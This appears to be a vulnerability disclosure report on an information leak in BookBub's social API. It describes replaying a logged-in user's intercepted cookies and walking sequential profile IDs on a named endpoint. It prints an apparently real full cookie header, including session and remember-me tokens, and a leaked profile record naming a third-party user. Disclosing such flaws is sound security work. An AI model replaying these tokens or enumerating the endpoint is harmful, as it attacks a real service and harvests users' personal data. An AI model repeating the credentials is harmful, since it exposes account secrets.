# About BookBub Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: __cf_bm=kKz7.8FQFb682ZrCNueMhOKCR7rXONylX2H0qp62C3A-1712125285-1.0.1.1-j6ElY5TTn6Cg5DfnSxwZTcWe3fClDdUAsZAaanwtsdRRxpOgYrDadGLSF4BQySffMrGkHLsGyoB09M90.Ck.qQ; _gcl_au=1.1.21048170.1712125288; _ga=GA1.1.386216571.1712125288; _li_dcdm_c=.bookbub.com; _lc2_fpi=6a2fe0e75190--01hth9x9gxd9hsgp91rt3q34mk; _lc2_fpi_meta={%22w%22:1712125290013}; _li_ss=CoABCgUIChDMFwoGCN0BEMwXCgUICRDMFwoGCOEBEMwXCgYIgQEQzBcKBgiiARDMFwoJCP____8HENYXCgYIiwEQzBcKBgjjARDMFwoGCKQBEMwXCgYIswEQzBcKBgiJARDMFwoGCKUBEMwXCgYI0gEQzBcKBQh-EMwXCgYIiAEQzBc; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaGJDRnNHYVFSYWV3TUNTU0lpSkRKaEpERXlKRk5pWW5sUU5FMHhPRUZhVkVNMFdGTklOM1l5Unk0R09nWkZWRWtpRlRFM01USXhNalV6TVRRdU9UazRPVElHT3dCRyIsImV4cCI6IjIwMzUtMDQtMDNUMDY6MjE6NTQuOTk4WiIsInB1ciI6bnVsbH19--64a142505ed7448b09de000d4c0b9331e9f71180; subscriber_id=33782618; bb_trck=eyJ0aWQiOjExMTMxNzcxNTAsInVpZCI6IjMzNzgyNjE4IiwiY3J0IjoxNzEy%0AMTI1Mjg1fQ%3D%3D%0A--3597bb2d5baf798f0389afc1ebafed18de1ce556; region=us; country_code=us; member-status=r; _li_ss_meta={%22w%22:1712125371275%2C%22e%22:1714717371275}; _lello2_session=3r3jDSAFPq9dUDdivHpGE2Mi2AHhnrhqBL7X4DlDzpEF2%2FKdAQH6p10Ieq6Nk0qFY8tWroqWQQDp5sHxRvjbwx8fwhMVkLWD7yd4BlRYIOJD2B6QXKyi4RBx3ZDaOB1QuLxYOtOFvzjMI%2BRPAmgSqEKfCtYvCXBOZYCqbMGiFF8JsIvHRQ66n%2FoAawoGbtGXVa45yIJPQ0mSMN9D9vMF374TRJvpWxYjhuOCZLHMFDIrtuFpIvRZcq%2F36zBtVyShbutu%2FQJCEfSR0lXFTmUKQNI6UXNd5jMscW4TZHb6nWBv3hVzL%2BpGi%2BGEhlko%2BNCmXpBg1iBt6axEzo2UUdgs1VaYITER3F2syzjxQPMd%2BPRmg1ADG025ag9wvxeiw5IwWsxzbg2uWbzIxF68ZebsUGNqDSLgHIJ7vfrIgNf7BYz69AOo8jKYAaYjNvyNN4JZ01tMZ1GfYpkn9BYZsuaPy7gEGaqOmlrY%2FII%2FvDkuIDoGgOeqIfenrTh15pDQt3%2BvaPvoveAKqT2uYLu2r2ADQhNc5gTEbymQSZurjRmIIPlS7eHWvAx8M5CF8PHLD3VZcpGQoqEI2NdvJGHXQk%2FPYNrZbHuk0UpGrGX%2BiRVJwDq3ZuZQE%2FNspbjpBeqAjRfHa%2FGvDXkog3I7zIXj6hxpOAPFm8XaS71yi2NZ11FD1jnDLh5HKZr%2B%2BfC%2B4PIgv6n%2FFafAymbX6zXN8mwoeaTmBbySpOSrW3%2BY1a9HO96TNzB%2FHp6yDVPlzYuG4lKniz9hs4qV1kQP4B8I%2BAGbfjrCP6IHcG1wfcZ3pabmSKyn%2BFTG6Wq%2FrqIJ5Cwd%2Bs%2B5ZEt8FWVyzJxiP4TnND4tcDoft172vHSihhgFBH42adzVghTKXgqd%2BxVm7tTYEBAKPB%2FVxgXY4LuV6R0%2Bd1oXbLD0iYCzbwxep8B6hOuRgj4Nm5Lzix2zgw%2B8G5lEtK%2FlUG2ESAH3cjfHuoQ4XRAL6Axm4XRyjXIvYMLTwQCLvmqP1yM7IirVXV7PMJ88tEVJKI89EgLx9Asdn5rQz6i3eSQGoIQeB4UhFbKJyktcYXNLTevslrMCGWL9tUt%2BeQs1rBrpLbQqKjMVe44fh9WSotx4%2Bq0Ly%2BCBxcygcrWHLEO%2FRL3cxvMm2kuKb%2F2tNB8qDD2GkqN%2F4lOiX97GqSEQiQBNJQwRxuqqDArXpq0Kmcno3ivuziYLV127yMJgbhtKHM7tQyw4%2BoEdAHVrqt0ykLKQBfRLsVJwgdICNhnkhD%2B0yHWFgMOb6HzTHW3CSctk1TubnZQoO5k%3D--lksAhasHHdxKmr24--xjgUjHoSuniyyVZTfH8EVA%3D%3D; _ga_CQ6ZYMZH0N=GS1.1.1712125287.1.1.1712125378.51.0.0
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: name.

> Request method: GET, information can be obtained by traversing the constructed Personal Unique Identifier,such as "41247492","41247491"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|---------|---|-----------|
|yizhimuzhu666|https://social-api.bookbub.com/profiles/post_count?id=41247492|Id=41247492|



### Leaked packet cases 
``` 
{
    "id": 41247492,
    "userId": *******9,
    "authorId": null,
    "displayName": "@dorothyhowell35",
    "name": "d***********",
    "username": "dorothyhowell35",
    "imageUrl": "https://d2rel4whvde6w7.cloudfront.net/email_assets/default_profile_image/d.png",
    "profileUrl": "https://www.bookbub.com/profile/3188451398",
    "defaultImage": "blue-grey",
    "tagline": null,
    "biography": null,
    "slug": "3188451398",
    "state": "visible",
    "private": false,
    "countryCode": "us",
    "isFollowing": null,
    "recommendationCount": 0
}
```